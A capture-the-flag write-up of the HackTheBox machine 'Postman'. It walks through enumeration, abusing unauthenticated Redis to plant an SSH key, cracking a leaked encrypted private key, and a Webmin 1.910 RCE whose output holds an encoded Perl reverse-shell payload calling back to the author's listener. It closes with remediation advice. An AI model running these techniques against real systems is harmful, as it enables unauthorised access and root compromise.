# Postman

```
root@kali:/home/kali/htb/Postman# nmap -p- -sV -sC 10.129.113.96
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 09:13 EDT
Nmap scan report for 10.129.113.96
Host is up (0.030s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.41 seconds
```

I go to the webserver on port 80, and it's an unfinished website. I find /upload/, but there's only images there.

the https server on port 10000 is a webmin login form.

```
root@kali:/home/kali/htb/Postman# searchsploit webmin
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                           | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                          | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                      | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                  | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                         | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                               | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                   | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                        | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                              | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                        | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                     | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                   | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                      | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                    | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                      | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                         | linux/remote/47230.rb
Webmin 1.x - HTML Email Command Execution                                                                                 | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                                                       | multiple/remote/2017.pl
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                                                        | multiple/remote/1997.php
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                             | linux/webapps/47330.rb
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/Postman# 
```

Nothing useful atm.


I check the redis port:

```
root@kali:/home/kali/htb/Postman# nc -vn 10.129.113.96 6379
Connection to 10.129.113.96 6379 port [tcp/*] succeeded!
info
$2727
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-58-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:649
run_id:e892381856b6dbc28b9ccb7e236fe4ae524fd188
tcp_port:6379
uptime_in_seconds:73520
uptime_in_days:0
hz:10
lru_clock:5119654
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:841240
used_memory_human:821.52K
used_memory_rss:3948544
used_memory_rss_human:3.77M
used_memory_peak:841240
used_memory_peak_human:821.52K
used_memory_peak_perc:100.00%
used_memory_overhead:832086
used_memory_startup:782456
used_memory_dataset:9154
used_memory_dataset_perc:15.57%
total_system_memory:941203456
total_system_memory_human:897.60M
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:4.69
mem_allocator:jemalloc-3.6.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1615658869
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:3
total_commands_processed:2
instantaneous_ops_per_sec:0
total_net_input_bytes:37
total_net_output_bytes:5529
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:b0c697f0dc6847eded2da28fd8e206ec5ec5f827
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:85.59
used_cpu_user:28.84
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Cluster
cluster_enabled:0

# Keyspace

client list
$150
id=5 addr=10.10.14.20:33108 fd=8 name= age=55 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=client
```


I look up some redis enumeration on google: https://book.hacktricks.xyz/pentesting/6379-pentesting-redis


```
root@kali:/home/kali/htb/Postman# redis-cli -h 10.129.113.96
10.129.113.96:6379> CONFIG GET *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "cluster-announce-ip"
  8) ""
  9) "unixsocket"
 10) ""
 11) "logfile"
 12) "/var/log/redis/redis-server.log"
 13) "pidfile"
 14) "/var/run/redis/redis-server.pid"
 15) "slave-announce-ip"
 16) ""
 17) "maxmemory"
 18) "0"
 19) "proto-max-bulk-len"
 20) "536870912"
 21) "client-query-buffer-limit"
 22) "1073741824"
 23) "maxmemory-samples"
 24) "5"
 25) "lfu-log-factor"
 26) "10"
 27) "lfu-decay-time"
 28) "1"
 29) "timeout"
 30) "0"
 31) "active-defrag-threshold-lower"
 32) "10"
 33) "active-defrag-threshold-upper"
 34) "100"
 35) "active-defrag-ignore-bytes"
 36) "104857600"
 37) "active-defrag-cycle-min"
 38) "25"
 39) "active-defrag-cycle-max"
 40) "75"
 41) "auto-aof-rewrite-percentage"
 42) "100"
 43) "auto-aof-rewrite-min-size"
 44) "67108864"
 45) "hash-max-ziplist-entries"
 46) "512"
 47) "hash-max-ziplist-value"
 48) "64"
 49) "list-max-ziplist-size"
 50) "-2"
 51) "list-compress-depth"
 52) "0"
 53) "set-max-intset-entries"
 54) "512"
 55) "zset-max-ziplist-entries"
 56) "128"
 57) "zset-max-ziplist-value"
 58) "64"
 59) "hll-sparse-max-bytes"
 60) "3000"
 61) "lua-time-limit"
 62) "5000"
 63) "slowlog-log-slower-than"
 64) "10000"
 65) "latency-monitor-threshold"
 66) "0"
 67) "slowlog-max-len"
 68) "128"
 69) "port"
 70) "6379"
 71) "cluster-announce-port"
 72) "0"
 73) "cluster-announce-bus-port"
 74) "0"
 75) "tcp-backlog"
 76) "511"
 77) "databases"
 78) "16"
 79) "repl-ping-slave-period"
 80) "10"
 81) "repl-timeout"
 82) "60"
 83) "repl-backlog-size"
 84) "1048576"
 85) "repl-backlog-ttl"
 86) "3600"
 87) "maxclients"
 88) "10000"
 89) "watchdog-period"
 90) "0"
 91) "slave-priority"
 92) "100"
 93) "slave-announce-port"
 94) "0"
 95) "min-slaves-to-write"
 96) "0"
 97) "min-slaves-max-lag"
 98) "10"
 99) "hz"
100) "10"
101) "cluster-node-timeout"
102) "15000"
103) "cluster-migration-barrier"
104) "1"
105) "cluster-slave-validity-factor"
106) "10"
107) "repl-diskless-sync-delay"
108) "5"
109) "tcp-keepalive"
110) "300"
111) "cluster-require-full-coverage"
112) "yes"
113) "cluster-slave-no-failover"
114) "no"
115) "no-appendfsync-on-rewrite"
116) "no"
117) "slave-serve-stale-data"
118) "yes"
119) "slave-read-only"
120) "yes"
121) "stop-writes-on-bgsave-error"
122) "yes"
123) "daemonize"
124) "yes"
125) "rdbcompression"
126) "yes"
127) "rdbchecksum"
128) "yes"
129) "activerehashing"
130) "yes"
131) "activedefrag"
132) "no"
133) "protected-mode"
134) "no"
135) "repl-disable-tcp-nodelay"
136) "no"
137) "repl-diskless-sync"
138) "no"
139) "aof-rewrite-incremental-fsync"
140) "yes"
141) "aof-load-truncated"
142) "yes"
143) "aof-use-rdb-preamble"
144) "no"
145) "lazyfree-lazy-eviction"
146) "no"
147) "lazyfree-lazy-expire"
148) "no"
149) "lazyfree-lazy-server-del"
150) "no"
151) "slave-lazy-flush"
152) "no"
153) "maxmemory-policy"
154) "noeviction"
155) "loglevel"
156) "notice"
157) "supervised"
158) "no"
159) "appendfsync"
160) "everysec"
161) "syslog-facility"
162) "local0"
163) "appendonly"
164) "no"
165) "dir"
166) "/var/lib/redis"
167) "save"
168) "900 1 300 10 60 10000"
169) "client-output-buffer-limit"
170) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
171) "unixsocketperm"
172) "0"
173) "slaveof"
174) ""
175) "notify-keyspace-events"
176) ""
177) "bind"
178) "0.0.0.0 ::1"
10.129.113.96:6379> 
```


So I find that `/var/lib/redis/` is the redis directory.

Following the guide on the hacktricks page:


```
root@kali:/home/kali/htb/Postman# (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
root@kali:/home/kali/htb/Postman# cat foo.txt 



ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd1kFi1wU6Lcw/ygzsakLKRsFKs7WKD7nCS3xoaCHflex4KyjWu+ifAAC1s7LONUrcLYGbtI9DL5ObklmzrsS5IDxDZc6aKZGf2Rb7PU/bn8g6Ini6+tJrrHIxhMGIrfx1g6GWNt+wyZZveClkgSHK2xGQ3w/F2xmbOewRWfv9FncJd3jsDDL+7Xiem7AYlEtP2Q+5k2Q+p4rr0gT1bEzS7aRANIFVftAA0wKIKN37zmg84U23/+XknHWn7DmWPAhaPE2QTIF/KIRUUiXg32ETOCZIRpPgHVgi42oiIES/c5GigDkbXZyY6CD9OGD+pGi+LvLQC+obIWFn+dMFjYVvXG6ekK6lRfYr/BNOYQLiiJNWO351SjMTAYg5fsrpGC2naFaVq+EEdpal03WtIFPG0IxWUeLG/J5grIs30+cm4coAyIaqkSkGYu99E5/l1abQbFWM3TeWN6sGs38qOGDUvLLlp8TwZ3HBn+MhOjCql0fqMvcoh0efT+nXxkCbqDs= acid_creative



root@kali:/home/kali/htb/Postman# cat foo.txt | redis-cli -h 10.129.113.96 -x set crackit
OK
root@kali:/home/kali/htb/Postman# redis-cli -h 10.129.113.96
10.129.113.96:6379> config set dir /var/lib/redis/.ssh
OK
10.129.113.96:6379> config set dbfilename "authorized_keys"
OK
10.129.113.96:6379> save
OK
10.129.113.96:6379> exit
root@kali:/home/kali/htb/Postman# ssh -i /root/.ssh/id_rsa redis@10.129.113.96
Enter passphrase for key '/root/.ssh/id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
/usr/bin/xauth:  file /var/lib/redis/.Xauthority does not exist
redis@Postman:~$ whoami
redis
redis@Postman:~$ 

```

I check Matt's home folder, /tmp/, /var/www, and the webmin folder, which I do not have access to. 

but in /opt/ I find a id_rsa backup:

```
redis@Postman:/$ cd opt
redis@Postman:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Sep 11  2019 .
drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
redis@Postman:/opt$ 

```

We can probably break this with john:

```
root@kali:/home/kali/htb/Postman# locate ssh2john
/home/kali/JohnTheRipper/run/ssh2john.py
/opt/JohnTheRipper/run/ssh2john.py
/usr/share/john/ssh2john.py
root@kali:/home/kali/htb/Postman# /opt/JohnTheRipper/run/ssh2john.py matt_rsa > matt_john
root@kali:/home/kali/htb/Postman# john matt_john -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (matt_rsa)
1g 0:00:00:04 50.88% (ETA: 11:08:27) 0.2469g/s 1824Kp/s 1824Kc/s 1824KC/s ilovetia2..ilovethomascollins
Session aborted
root@kali:/home/kali/htb/Postman# 
```

I then try to login with ssh as matt:

```
root@kali:/home/kali/htb/Postman# ssh -i matt_rsa Matt@10.129.113.96
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'matt_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "matt_rsa": bad permissions
Matt@10.129.113.96's password: 
Permission denied, please try again.
Matt@10.129.113.96's password: 
Permission denied, please try again.
Matt@10.129.113.96's password: 

root@kali:/home/kali/htb/Postman# ssh -i /root/.ssh/id_rsa redis@10.129.113.96
Enter passphrase for key '/root/.ssh/id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Mar 14 15:00:10 2021 from 10.10.14.20
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ whoami
Matt
Matt@Postman:/var/lib/redis$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
Matt@Postman:/var/lib/redis$ sudo -l
[sudo] password for Matt: 
Sorry, user Matt may not run sudo on
```

This did not work, so I just upgraded from redis to Matt instead.

I remember from lurking that the .bash_history file was not redirecting to null:

```
Matt@Postman:~$ cat .bash_history 
sudo -l
pwd
ls -la
wget https://gist.githubusercontent.com/fabiand/5628006/raw/fe02391084e634092681e3cbe5b7525545f83b84/SimpleHTTPPutServer.py
ls
python SimpleHTTPPutServer.py 8080
mv SimpleHTTPPutServer.py /var/www/html/SimpleHTTPPutServer.py
mv SimpleHTTPPutServer.py /var/www/html/
apt install apache2
su root
mv SimpleHTTPPutServer.py /var/www/html/
su root
cd /var/www/html
ls
python SimpleHTTPPutServer 8080
python -m SimpleHTTPPutServer 8080
service apache2 stop
rm index.html 
su root
exit
cd ..
crontab -e
reboot
exit
python -m SimpleHTTPPutServer 8080
python -m SimpleHTTPServer 8080
ls
chmod 700 flag.txt
python server.py 8080
python server.py 127.0.0.1 8080
python server.py 127.0.0.1:8080
mkdir server
mv server server/
ls
mv server.py server/
cd server
ls
cp ../.ssh/id_rsa id_rsa.bak
ls
cd ..
ls
ls -la
passwd
nano server/server.py 
python3 server/server.py 
nano server/server.py 
ssh-keygen
openssl genrsa -des3 -out private.pem 2048
ls
cat private.pem
mv private.pem server/id_rsa.bak
ls
cd server
ls
python3 server.py 
python server.py 
python server.py 127.0.0.1:8080
su root
ls
nano server.py import sys
nano server.py
python server.py 8080
python server.py 127.0.0.1:8080
ls
service redis restart
su root
ls
echo 'Well Done' > flag.txt
su root
ls
chmod u+s base64
ls -la
crontab -e
exit
cd ~/
ls
cd server
ls
nano reminder
nano justincase.txt
exit
crontab -l
crontab -e
reboot
exit
cd ~/
nano user.txt
rm flag.txt 
clear
cd /var/lib/redis
exit
cd ~/
cat user.txt
exit
cd ~/server/
ls
nano justincase.txt 
python server.py
python server.py 127.0.0.1:8080
su root
crontab -l
crontab -r
crontab -l
clear
exit
cd /home/Matt
ls -la
cat user.txt
su redis
exit
Matt@Postman:~$ 
```

I see the crontab inputs, so I upload pspy to see if I can find any dubious crontabs. But I can't find anything.

The only lead I still have is the webmin server. I do not have access to it directly on the machine.

But I am able to log on with Matt:computer2008

It is version 1.910

I revisit my searchsploit logs for any authenticated privesc:

```
root@kali:/home/kali/htb/Postman# searchsploit webmin
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                           | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                          | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                      | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                  | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                         | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                               | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                   | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                        | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                              | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                        | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                     | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                   | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                      | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                    | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                      | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                         | linux/remote/47230.rb
Webmin 1.x - HTML Email Command Execution                                                                                 | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                                                       | multiple/remote/2017.pl
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                                                        | multiple/remote/1997.php
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                             | linux/webapps/47330.rb
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/Postman# 
```

The Package updates remote command execution should give root. Since I know webmin runs as root.

I find https://github.com/NaveenNguyen/Webmin-1.910-Package-Updates-RCE/blob/master/exploit_poc.py

I try it with a couple of different payloads, but nothing works. The reason it uses perl is because webmin uses perl, so perl has to be installed on the target system.

```
root@kali:/home/kali/htb/Postman# python3 exploit_poc.py --ip_address=10.129.113.96 --port=10000 --lhost=10.10.14.20 --lport=445 --user="matt" --pass="computer2008"

Webmin 1.9101- 'Package updates' RCE                                                                                                                        
                                                                                                                                                            
[+] Generating Payload...
[+] Reverse Payload Generated : u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7Becho%2CcGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4yMDo0NDUiKTtTVERJTi0%2BZmRvcGVuKCRjLHIpOyR%2BLT5mZG9wZW4oJGMsdyk7d2hpbGUoPD4pe2lmKCRfPX4gLyguKikvKXtzeXN0ZW0gJDE7fX07Jw%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22&ok_top=Update+Selected+Packages
[+] Attempting to login to Webmin
[+] Login Successful
[+] Attempting to Exploit
[+] Exploited Successfully
root@kali:/home/kali/htb/Postman# 
```


But my nc listener does not recieve anything. I find another one at https://github.com/roughiz/Webmin-1.910-Exploit-Script

If this does not work, I'll write my own based off the metasploit version as I've done before.

```
root@kali:/home/kali/htb/Postman# python webmin_exploit.py --rhost=10.129.113.96 --rport=10000 --lhost=10.10.14.20 --lport=1337 -u "Matt" -p "computer2008" -s=True
****************************** Webmin 1.910 Exploit By roughiz*******************************
*********************************************************************************************
*********************************************************************************************
*********************************************************************************************
****************************** Retrieve Cookies sid *****************************************


********** [+] [Exploit] The Cookie is 9fe6409fda8c1fa2551e96d1379233c0

********************************************************************************************
****************************** Create payload and Exploit ***********************************




********** [+] [Exploit] Verify you nc listener on port 1337 for the incomming reverse shell
root@kali:/home/kali/htb/Postman# 

```

And on the listener:

```
root@kali:/home/kali/htb/Postman# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.113.96 34524
whoami
root
```


## Comparing myself to the official writeup:

They verify that the redis does not require authentication. And they then proceed to add their own ssh key.

They find the backup ssh file with LinPeas, and crack it to get the creds for user Matt.

Just like me, they do not find anything of importance on the machine and move on over to the webmin page.

they get the version, and then find the packages exploit. 

They use burpsuite to alter the request in order to add their payload. And recieves shell.




## How to stop this exploit:

The redis service being completely open is the biggest culprit. It allows the attacker access to the machine. Redis comes with authentication, so enabling that should be fairly easy to do.

It should also go without saying, but keeping backup ssh keys available for all users is a bad idea.

Finally, the webmin service should be updated. As the vulnerability has been patched.
